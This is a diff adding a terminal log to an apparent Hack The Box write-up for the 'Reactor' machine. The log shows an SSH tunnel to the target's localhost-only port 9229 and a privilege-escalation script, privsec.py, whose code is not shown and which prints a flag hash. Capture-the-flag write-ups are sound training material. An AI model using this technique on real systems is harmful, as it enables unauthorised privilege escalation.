@@ -1662,6 +1662,30 @@ Because it is bound to `127.0.0.1`, it is not directly reachable from the attack
 <div align="center">
 <br>
 <br>
+</div>
+
+###
+```shell
+                                                                                          
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
+└─$ ssh -L 9229:127.0.0.1:9229 engineer@10.129.13.245 -N &
+[1] 152372
+                                                                                          
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
+└─$ 
+[1]  + suspended (tty output)  ssh -L 9229:127.0.0.1:9229 engineer@10.129.13.245 -N
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
+└─$ vi privsec.py
+                                                                                          
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
+└─$ python3 privsec.py                                     
+fab4252120bf323ccadc3b9be935bfa0
+
+
+```
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
